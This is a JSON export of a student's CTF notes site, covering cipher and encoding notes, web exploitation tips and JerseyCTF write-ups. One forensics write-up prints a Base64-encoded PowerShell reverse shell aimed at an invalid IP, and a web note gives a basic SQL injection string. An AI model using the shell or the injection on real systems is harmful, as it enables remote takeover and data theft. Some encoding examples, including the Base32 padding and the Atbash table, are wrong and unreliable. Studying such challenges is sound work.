{"CTF/Bin-Exp/Binary-Exploitation":{"slug":"CTF/Bin-Exp/Binary-Exploitation","filePath":"CTF/Bin Exp/Binary Exploitation.md","title":"Binary Exploitation","links":[],"tags":[],"content":""},"CTF/CTF":{"slug":"CTF/CTF","filePath":"CTF/CTF.md","title":"CTF","links":["CTF/Bin-Exp/Binary-Exploitation","CTF/Cryptography/Cryptography","CTF/Forensics/Forensics","CTF/Osint/Open-Source-Intelligence","CTF/Rev/Reverse-Engineering","CTF/Web-Exp/Web-Exploitation","CTF/Misc/Miscellaneous","CTF/CTFS/ISSESSIONS-CTF"],"tags":[],"content":"Categories\nBinary Exploitation\nCryptography\nForensics\nOpen Source Intelligence\nReverse Engineering\nWeb Exploitation\nMiscellaneous\nCTFs\nISSESSIONS CTF"},"CTF/CTFS/ISSESSIONS-CTF":{"slug":"CTF/CTFS/ISSESSIONS-CTF","filePath":"CTF/CTFS/ISSESSIONS CTF.md","title":"ISSESSIONS CTF","links":[],"tags":[],"content":""},"CTF/CTFS/MagpieCTF":{"slug":"CTF/CTFS/MagpieCTF","filePath":"CTF/CTFS/MagpieCTF.md","title":"MagpieCTF","links":[],"tags":[],"content":""},"CTF/CTFS/PicoCTF":{"slug":"CTF/CTFS/PicoCTF","filePath":"CTF/CTFS/PicoCTF.md","title":"PicoCTF","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Atbash":{"slug":"CTF/Cryptography/Ciphers/Atbash","filePath":"CTF/Cryptography/Ciphers/Atbash.md","title":"Atbash","links":[],"tags":[],"content":"Tools:\nwww.dcode.fr/atbash-cipher\nVery simple cipher, it just reverses the order of the alphabet so to say.\nSo:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nABCDEFGHIJKLMZYXWVUTSRQPONNOPQRSTUVWXYZMLKJIHGFEDCBA\nSo to encrypt ‘Man’\nM - N\na - Z\nn - M\nSo ‘Man’ = ‘NZM’\nNote: Atbash doesn’t notice casing, all letters are treated as capitals"},"CTF/Cryptography/Ciphers/BCrypt":{"slug":"CTF/Cryptography/Ciphers/BCrypt","filePath":"CTF/Cryptography/Ciphers/BCrypt.md","title":"BCrypt","links":["tags/Hashing","CTF/Cryptography/Ciphers/Blowfish"],"tags":["Hashing"],"content":"Hashing\nBlowfish\nTools:\ngchq.github.io/CyberChef/#recipe=Bcrypt(10)\nwww.devglan.com/online-tools/bcrypt-hash-generator\nwww.dcode.fr/crypt-hashing-function\nNote: There is no easy way of decoding a BCrypt Cipher\nOf those tools above, I’m not sure if any could actually break\na fully secure BCrypt\n\nen.wikipedia.org/wiki/Bcrypt ^\nIt is far too complicated for me to explain in this, just look at the wiki"},"CTF/Cryptography/Ciphers/Base32":{"slug":"CTF/Cryptography/Ciphers/Base32","filePath":"CTF/Cryptography/Ciphers/Base32.md","title":"Base32","links":["tags/Base"],"tags":["Base"],"content":"Base\nTools:\nwww.dcode.fr/base-32-encoding\ngchq.github.io/CyberChef/\ncryptii.com/pipes/base32 especially good for the different variants of Base32\nBase32 is a binary to text encoding scheme that represents binary data in an ASCII string format\nUses:\n\nOr it uses:\n\nOr it uses:\n\nOr it uses:\n\nNote they also have ’=’ as an index 32 of sorts\n= Is a padding character that doesn’t change the meaning\nThe most common alphabet is RFC 4648\nExample:\nTake the source string “Man”\nIn ASCII:\nM-77\na-97\nn-110\nThat ASCII in bits then equals:\n77 - 01001101\n97 - 01100001\n110 - 01101110\nPutting those strings together you get\n010011010110000101101110\nThen separating those into sets of 5 bits:\n01001 - 9\n10101 - 21\n10000 - 16\n10110 - 22\n1110 - NAN\nbut instead of giving an error, you add ones until you get full set, then append an = at the end:\n11100 - 28\n\n=\nThen putting that from ASCII into the Base32 alphabet\n\n9 - J\n21 - V\n16 - Q\n22 - W\n28 - 4\n= - =\nSo the encrypted text would be:\n‘Man’ = JVQW4="},"CTF/Cryptography/Ciphers/Base64":{"slug":"CTF/Cryptography/Ciphers/Base64","filePath":"CTF/Cryptography/Ciphers/Base64.md","title":"Base64","links":["tags/Base","CTF/CTFS/ISSESSIONS-CTF"],"tags":["Base"],"content":"Base\nTools:\nwww.base64decode.org/\nwww.dcode.fr/base-64-encoding\ngchq.github.io/CyberChef/\nBase64 is a binary to text encoding scheme that represents binary data in an ASCII string format\nUses:\n\nThere are two versions that have a different 62/63rd character\n\nNote the standard Base64 also has ’=’ as an index 64 of sorts\n= Is a padding character that doesn’t change the meaning\nExample:\nTake the source string “Man”\nIn ASCII:\nM-77\na-97\nn-110\nThat ASCII in bits then equals:\n77 - 01001101\n97 - 01100001\n110 - 01101110\nPutting those strings together you get\n010011010110000101101110\nThen, by separating that into sets of 6 bits you get\n010011 - 19\n010110 - 22\n000101 - 5\n101110 - 46\nIn the table above. in Base64 those translate to:\n19 - T\n22 - W\n5 - F\n46 - u\nSo, ‘Man’ using Base64 translates to ‘TWFu’\nIf for example, you only had ‘Ma’\nIn ASCII, it would be\nM-77\na-91\nin binary:\n77 - 01001101\n91 - 01100001\nIn sets of 6 bits:\n010011 - 19\n010110 - 22\n0001 -NAN\nBut instead of raising an error, it then appends 0’s til you have a set of 6 bits, and appends an ’=’ at the end of the string\nso 0001 becomes\n000100 - 4\nAnd:\n19 - T\n22 - W\n4 - E\nAppended =\nSo ‘Ma’ translates into ‘TWE=’\nAn example of a challenge where this is useful is:\nISSESSIONS CTF Easy Key 4\nYou’ve intercepted a base64 password and its right here : YWhJc2VleW91Z290X3RoZXBhc3N3b3JkLXlvdS13aW4. Yogur task is to unlock the true fla. In puzzles like this, balance is key. Maybe this string equals the flag if something is added. But you must be careful since too many cooks spoil the broth. You must change the recipe without changing the taste. Can this even be done? It may be possible to change the password without changing the meaning.\nYou also got this weird one. I don’t know what they are. It could be helpful since it looks like base64.\nCoCwpgBAZgNghgcwgSwM4QC7gE5gDQQCeA9gK4QhwBukyGmOYAdC00A==\nrZjetu8D7gfy4QnZAJGRMGwb5tBLUBcvUvkY3LEK2dxjVzNE6kT1ou09Un1mEVqN5jR===\n=\nYruDaoDF4AWD5MbtsDi=====\nThe solution to this was to take YWhJc2VleW91Z290X3RoZXBhc3N3b3JkLXlvdS13aW4 and add ===\nSo the final key was bhbureauCTF{YWhJc2VleW91Z290X3RoZXBhc3N3b3JkLXlvdS13aW4 === } as adding the ’=’ doesn’t change the decoded text at all."},"CTF/Cryptography/Ciphers/Block-Transposition-Cipher":{"slug":"CTF/Cryptography/Ciphers/Block-Transposition-Cipher","filePath":"CTF/Cryptography/Ciphers/Block Transposition Cipher.md","title":"Block Transposition Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Blowfish":{"slug":"CTF/Cryptography/Ciphers/Blowfish","filePath":"CTF/Cryptography/Ciphers/Blowfish.md","title":"Blowfish","links":["tags/Hashing","CTF/Cryptography/Ciphers/BCrypt"],"tags":["Hashing"],"content":"Hashing\nBCrypt"},"CTF/Cryptography/Ciphers/CSR-Certificate":{"slug":"CTF/Cryptography/Ciphers/CSR-Certificate","filePath":"CTF/Cryptography/Ciphers/CSR Certificate.md","title":"CSR Certificate","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Caesar-Cipher":{"slug":"CTF/Cryptography/Ciphers/Caesar-Cipher","filePath":"CTF/Cryptography/Ciphers/Caesar Cipher.md","title":"Caesar Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Hashing":{"slug":"CTF/Cryptography/Ciphers/Hashing","filePath":"CTF/Cryptography/Ciphers/Hashing.md","title":"Hashing","links":["tags/Hashing","CTF/Cryptography/Ciphers/MD5","CTF/Cryptography/Ciphers/BCrypt","CTF/Cryptography/Ciphers/SHA1","CTF/Cryptography/Ciphers/SHA256","CTF/Cryptography/Ciphers/SHA512","CTF/Cryptography/Ciphers/Blowfish"],"tags":["Hashing"],"content":"Hashing\nMD5\nBCrypt\nSHA1\nSHA256\nSHA512\nBlowfish"},"CTF/Cryptography/Ciphers/Hexadecimal":{"slug":"CTF/Cryptography/Ciphers/Hexadecimal","filePath":"CTF/Cryptography/Ciphers/Hexadecimal.md","title":"Hexadecimal","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Leet-Speak":{"slug":"CTF/Cryptography/Ciphers/Leet-Speak","filePath":"CTF/Cryptography/Ciphers/Leet Speak.md","title":"Leet Speak","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/MD5":{"slug":"CTF/Cryptography/Ciphers/MD5","filePath":"CTF/Cryptography/Ciphers/MD5.md","title":"MD5","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Mod-and-Match":{"slug":"CTF/Cryptography/Ciphers/Mod-and-Match","filePath":"CTF/Cryptography/Ciphers/Mod and Match.md","title":"Mod and Match","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Morse-Code":{"slug":"CTF/Cryptography/Ciphers/Morse-Code","filePath":"CTF/Cryptography/Ciphers/Morse Code.md","title":"Morse Code","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/RSA-Cipher":{"slug":"CTF/Cryptography/Ciphers/RSA-Cipher","filePath":"CTF/Cryptography/Ciphers/RSA Cipher.md","title":"RSA Cipher","links":["CTF/CTFS/MagpieCTF"],"tags":[],"content":"MagpieCTF\nexamples\nMagpieCTF\nimp3rf3ct:\ninverse-converse\nall-ends-same\ngrey-area"},"CTF/Cryptography/Ciphers/Rail-Fence-Cipher":{"slug":"CTF/Cryptography/Ciphers/Rail-Fence-Cipher","filePath":"CTF/Cryptography/Ciphers/Rail Fence Cipher.md","title":"Rail Fence Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/SHA1":{"slug":"CTF/Cryptography/Ciphers/SHA1","filePath":"CTF/Cryptography/Ciphers/SHA1.md","title":"SHA1","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/SHA256":{"slug":"CTF/Cryptography/Ciphers/SHA256","filePath":"CTF/Cryptography/Ciphers/SHA256.md","title":"SHA256","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/SHA512":{"slug":"CTF/Cryptography/Ciphers/SHA512","filePath":"CTF/Cryptography/Ciphers/SHA512.md","title":"SHA512","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Steganography":{"slug":"CTF/Cryptography/Ciphers/Steganography","filePath":"CTF/Cryptography/Ciphers/Steganography.md","title":"Steganography","links":["CTF/CTFS/MagpieCTF","CTF/Web-Exp/Web-Exploitation"],"tags":[],"content":"MagpieCTF\nexamples\nMagpieCTF\nHelmet:\nWeb Exploitation"},"CTF/Cryptography/Ciphers/Substitution-Cipher":{"slug":"CTF/Cryptography/Ciphers/Substitution-Cipher","filePath":"CTF/Cryptography/Ciphers/Substitution Cipher.md","title":"Substitution Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Vigenere-Cipher":{"slug":"CTF/Cryptography/Ciphers/Vigenere-Cipher","filePath":"CTF/Cryptography/Ciphers/Vigenere Cipher.md","title":"Vigenere Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Whitespace-Cipher":{"slug":"CTF/Cryptography/Ciphers/Whitespace-Cipher","filePath":"CTF/Cryptography/Ciphers/Whitespace Cipher.md","title":"Whitespace Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/XOR-Cipher":{"slug":"CTF/Cryptography/Ciphers/XOR-Cipher","filePath":"CTF/Cryptography/Ciphers/XOR Cipher.md","title":"XOR Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Cryptography":{"slug":"CTF/Cryptography/Cryptography","filePath":"CTF/Cryptography/Cryptography.md","title":"Cryptography","links":["CTF/CTF","CTF/Cryptography/Ciphers/Base64","CTF/Cryptography/Ciphers/Base32","CTF/Cryptography/Ciphers/Vigenere-Cipher","CTF/Cryptography/Ciphers/Caesar-Cipher","CTF/Cryptography/Ciphers/CSR-Certificate","CTF/Cryptography/Ciphers/Substitution-Cipher","CTF/Cryptography/Ciphers/Rail-Fence-Cipher","CTF/Cryptography/Ciphers/Block-Transposition-Cipher","CTF/Cryptography/Ciphers/Steganography","CTF/Cryptography/Ciphers/Mod-and-Match","CTF/Cryptography/Ciphers/RSA-Cipher","CTF/Cryptography/Ciphers/Morse-Code","CTF/Cryptography/Ciphers/SHA1","CTF/Cryptography/Ciphers/SHA256","CTF/Cryptography/Ciphers/SHA512","CTF/Cryptography/Ciphers/MD5","CTF/Cryptography/Ciphers/BCrypt","CTF/Cryptography/Ciphers/Whitespace-Cipher","CTF/Cryptography/Ciphers/Hexadecimal","CTF/Cryptography/Ciphers/XOR-Cipher","CTF/Cryptography/Ciphers/Atbash","CTF/Cryptography/Ciphers/Leet-Speak","CTF/Cryptography/Ciphers/Blowfish"],"tags":[],"content":"CTF\nCryptography is used to denote the subset of challenges that require decoding/encrypting certain text in order to get another answer/flag\nOne of the best tools for identifying which cipher to use for the encrypted text is:\nwww.dcode.fr/cipher-identifier\nCiphers\nBase64\nBase32\nVigenere Cipher\nCaesar Cipher\nCSR Certificate\nSubstitution Cipher\nRail Fence Cipher\nBlock Transposition Cipher\nSteganography\nMod and Match\nRSA Cipher\nMorse Code\nSHA1\nSHA256\nSHA512\nMD5\nBCrypt\nWhitespace Cipher\nHexadecimal\nXOR Cipher\nAtbash\nLeet Speak\nBlowfish"},"CTF/Forensics/Forensics":{"slug":"CTF/Forensics/Forensics","filePath":"CTF/Forensics/Forensics.md","title":"Forensics","links":[],"tags":[],"content":""},"CTF/Misc/Miscellaneous":{"slug":"CTF/Misc/Miscellaneous","filePath":"CTF/Misc/Miscellaneous.md","title":"Miscellaneous","links":[],"tags":[],"content":""},"CTF/Osint/Open-Source-Intelligence":{"slug":"CTF/Osint/Open-Source-Intelligence","filePath":"CTF/Osint/Open Source Intelligence.md","title":"Open Source Intelligence","links":[],"tags":[],"content":""},"CTF/Rev/Reverse-Engineering":{"slug":"CTF/Rev/Reverse-Engineering","filePath":"CTF/Rev/Reverse Engineering.md","title":"Reverse Engineering","links":[],"tags":[],"content":""},"CTF/Web-Exp/Browser-Edit":{"slug":"CTF/Web-Exp/Browser-Edit","filePath":"CTF/Web Exp/Browser Edit.md","title":"Browser Edit","links":["CTF/CTFS/PicoCTF"],"tags":[],"content":"PicoCTF\nInspect element,\nin the three dots at the top right click more tools\nThen click network conditions\nThen scroll down and change user from\n“custom browser” to the desired browser"},"CTF/Web-Exp/Common-http-add-ons":{"slug":"CTF/Web-Exp/Common-http-add-ons","filePath":"CTF/Web Exp/Common http add-ons.md","title":"Common http add-ons","links":["CTF/CTFS/MagpieCTF","CTF/CTFS/PicoCTF"],"tags":[],"content":"MagpieCTF   PicoCTF\n/robots.txt\n/login\n/admin\n/.htaccess\n/.DS_Store"},"CTF/Web-Exp/Cookie-Bypass":{"slug":"CTF/Web-Exp/Cookie-Bypass","filePath":"CTF/Web Exp/Cookie Bypass.md","title":"Cookie Bypass","links":["CTF/CTFS/MagpieCTF"],"tags":[],"content":"MagpieCTF"},"CTF/Web-Exp/SQL-injection":{"slug":"CTF/Web-Exp/SQL-injection","filePath":"CTF/Web Exp/SQL injection.md","title":"SQL injection","links":["CTF/CTFS/PicoCTF"],"tags":[],"content":"PicoCTF\nBasic SQL injection:\n’ OR 1=1—"},"CTF/Web-Exp/Web-Exploitation":{"slug":"CTF/Web-Exp/Web-Exploitation","filePath":"CTF/Web Exp/Web Exploitation.md","title":"Web Exploitation","links":["tags/ctf"],"tags":["ctf"],"content":"ctf"},"WRITEUPS/JerseyCTF/Read-the-Rules":{"slug":"WRITEUPS/JerseyCTF/Read-the-Rules","filePath":"WRITEUPS/JerseyCTF/Read the Rules.md","title":"Read the Rules","links":[],"tags":[],"content":"Worth 1 pt\nJerseyCTF V Rules\nPlease open the attached pdf, and read the rules and terms &amp; conditions to gain access to all the challenges for JerseyCTF V (the flag is in the pdf)\nNotes for the JerseyCTF V\nPlease note that all flags are case sensitive, and unless otherwise specified in the challenge description, follow the format shown below:\nFlag format for JerseyCTF V : jctfv{answer_flags_like_this}\nAfter reading the rules, I figured I had to read the attached PDF in order to find the flag (Quite the forensics challenge)\nAfter parsing through the attached pdf file, I found the following at the very bottom of the third page after much searching and suffering: jctfv{i_agree_to_the_rules}\nAnd luckily, it was the right flag!\n"},"WRITEUPS/JerseyCTF/The-Veiled-Backtrace":{"slug":"WRITEUPS/JerseyCTF/The-Veiled-Backtrace","filePath":"WRITEUPS/JerseyCTF/The-Veiled-Backtrace.md","title":"The-Veiled-Backtrace","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription:\nThe-Veiled-Backtrace\nForensics \nWorth 930 Points \nEasy \nBy Trent\n\nA hard drive full of photos. Hundreds of still frames, nothing out of the ordinary. But something’s tucked away — veiled, deliberate. One image holds more than meets the eye. Peel back the layers. Follow the trace.\nFlag format: jctf{IP:Port} Note: For this challenge the flag format is NOT jctfv{} but instead jctf{} Note: The IP is not a valid/real IP, this is for your protection.\nAnd it had a download link to ‘archive.zip’ which contained 100 jpg files and 1 ’…’ file.\n\nSolution\nInitially, because this was a forensics challenge, I thought I had to go through each image in order to find some sort of hidden data, so I spent ~30 minutes putting the jpgs through exiftool in order to find anything, but came up with nothing.\nThen I realized (After way too long) that there was a non-jpg file in the zip: ’…’\nAfter opening ’…’ it gave:\nÿØÿàZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzY3OC40NjIuMTQ2LjMzNCcsIDg3ODkpOyROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTskU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJFRDUENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9OyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfVdyaXRlVG9TdHJlYW0gJyc7d2hpbGUoKCRCeXRlc1JlYWQgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgpIg== \nWhich after seeing it ending with == I immediately recognized it as base64 code, and after decrypting it, it gave:\nNet.Sockets.TCPClient(&#039;678.462.146.334&#039;, 8789)\n(Note it gave a lot more text, but whenever I put that into this file, Windows considered it a trojan horse and completely wiped this folder)\nAnd from that I noticed what the flag format was trying to get:\njctf{IP:Port} Note: The IP is not a valid/real IP, this is for your protection\nFlag\nSo after putting them together I got the flag\n“jctf{678.462.146.334:8789}”"},"dummy-trigger":{"slug":"dummy-trigger","filePath":"dummy-trigger.md","title":"dummy-trigger","links":[],"tags":[],"content":""},"index":{"slug":"index","filePath":"index.md","title":"Welcome to Prof-Starsky's CTF Write-up Digital Garden","links":["WRITEUPS"],"tags":[],"content":"Welcome to Prof-Starsky’s Digital Garden!\nThis is my collection of my CTF writeups\nSections\n\nWriteups - Detailed writeups for various projects and challenges.\n"}}